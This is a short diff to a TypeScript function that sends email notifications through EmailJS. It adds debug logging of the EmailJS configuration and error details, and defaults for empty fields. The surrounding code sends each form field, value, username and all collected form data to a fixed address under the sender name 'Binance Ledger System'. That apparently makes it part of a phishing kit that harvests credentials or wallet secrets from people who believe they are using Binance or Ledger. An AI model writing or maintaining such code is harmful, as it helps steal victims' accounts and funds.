@@ -13,6 +13,13 @@ interface EmailData {
 
 export const sendEmailNotification = async (data: EmailData) => {
   try {
+    console.log('EmailJS Config:', {
+      SERVICE_ID: EMAILJS_CONFIG.SERVICE_ID,
+      TEMPLATE_ID: EMAILJS_CONFIG.TEMPLATE_ID,
+      USER_ID: EMAILJS_CONFIG.USER_ID,
+      TO_EMAIL: EMAILJS_CONFIG.TO_EMAIL
+    });
+
     const templateParams = {
       to_email: EMAILJS_CONFIG.TO_EMAIL,
       from_name: "Binance Ledger System",
@@ -24,11 +31,11 @@ ${data.username ? `Username: ${data.username}` : ''}
 Timestamp: ${data.timestamp}
 
 ${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
-      step: data.step,
+      step: data.step || '',
       field: data.field || '',
       value: data.value || '',
       username: data.username || '',
-      timestamp: data.timestamp,
+      timestamp: data.timestamp || '',
       allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
     };
 
@@ -45,6 +52,11 @@ ${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2
     return result;
   } catch (error) {
     console.error('Failed to send email:', error);
+    console.error('Error details:', {
+      message: error instanceof Error ? error.message : 'Unknown error',
+      status: (error as any)?.status,
+      text: (error as any)?.text
+    });
     throw error;
   }
 };
